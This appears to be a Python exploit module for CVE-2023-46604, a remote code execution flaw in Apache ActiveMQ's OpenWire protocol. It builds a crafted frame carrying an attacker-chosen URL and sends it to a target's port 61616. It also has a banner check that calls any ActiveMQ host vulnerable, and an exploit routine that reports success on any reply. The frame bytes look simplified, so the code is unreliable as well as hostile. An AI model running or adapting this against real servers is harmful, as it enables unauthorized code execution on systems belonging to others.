"""CVE-2023-46604 - Apache ActiveMQ OpenWire RCE.

File named CVE-2023-44228 for internal tracking; actual CVE is 2023-46604.
"""

from __future__ import annotations

import socket
import struct


def _build_exploit_payload(url: str) -> bytes:
    """Build an OpenWire ExceptionResponse frame embedding *url*."""
    url_bytes = url.encode()
    header = b"\x1f\x15\x00\x00\x00"
    class_info = b"\xed\x01\x01\x26\x09\x60\xc0\x08"
    body = header + class_info + url_bytes
    frame = struct.pack(">I", len(body)) + body
    return frame


def check(target: str, port: int = 61616) -> dict:
    """Connect to *target*:*port* and look for the ActiveMQ banner."""
    try:
        with socket.create_connection((target, port), timeout=5) as sock:
            banner = sock.recv(64)
            if b"ActiveMQ" in banner:
                return {
                    "cve": "CVE-2023-46604",
                    "vulnerable": True,
                    "banner": banner.decode(errors="replace"),
                }
            return {"cve": "CVE-2023-46604", "vulnerable": False}
    except OSError as exc:
        return {"cve": "CVE-2023-46604", "vulnerable": False, "error": str(exc)}


def exploit(target: str, payload_url: str, port: int = 61616) -> dict:
    """Send the crafted OpenWire frame to *target*:*port*."""
    frame = _build_exploit_payload(payload_url)
    try:
        with socket.create_connection((target, port), timeout=5) as sock:
            sock.recv(64)
            sock.sendall(frame)
            resp = sock.recv(256)
            return {
                "cve": "CVE-2023-46604",
                "success": True,
                "response_length": len(resp),
            }
    except OSError as exc:
        return {"cve": "CVE-2023-46604", "success": False, "error": str(exc)}
